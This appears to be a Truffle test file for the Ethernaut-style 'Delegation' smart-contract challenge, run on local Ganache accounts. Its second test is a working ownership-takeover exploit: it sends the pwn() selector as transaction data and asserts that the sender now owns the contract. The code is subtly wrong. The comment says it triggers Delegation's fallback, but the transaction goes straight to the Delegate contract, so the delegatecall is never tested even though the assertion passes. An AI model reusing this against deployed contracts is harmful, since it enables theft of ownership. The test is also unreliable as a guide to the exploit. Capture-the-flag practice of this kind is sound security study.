const Delegate = artifacts.require("Delegate")
const Delegation = artifacts.require("Delegation")

contract("Delegation", ([owner]) => {
    
    let delegate
    let delegation
    const delegateOwner = "0xfC407CB424E6dFb4f15168b9238e5ab39f99c2Be"
    
    describe('Ownership', async () => {
        beforeEach(async () => {
            delegate = await Delegate.deployed()
            delegation = await Delegation.deployed()
        })

        it('should confirm contracts owner', async () => {
            // delegate contract owner is 2nd Ganache account
            assert.equal(await delegate.owner(), delegateOwner)
            // delegation contract owner is 1st Ganache account
            assert.equal(await delegation.owner(), owner)     
        })

        it('makes the delegate call and takes ownership of the contract', async () => {
            // Use the fallback method to call the delegate's pwn()
            const pwner = web3.utils.sha3("pwn()").substring(0, 10)
            await (web3.eth.sendTransaction)({
            from: owner,
            to: delegate.address,
            data: pwner
            })
            // Player should own the instance now
            const newOwner = await delegate.owner.call()
            console.log(`new instance owner:`, newOwner)
            assert.equal(newOwner, owner)
            
            

        })
    })
})


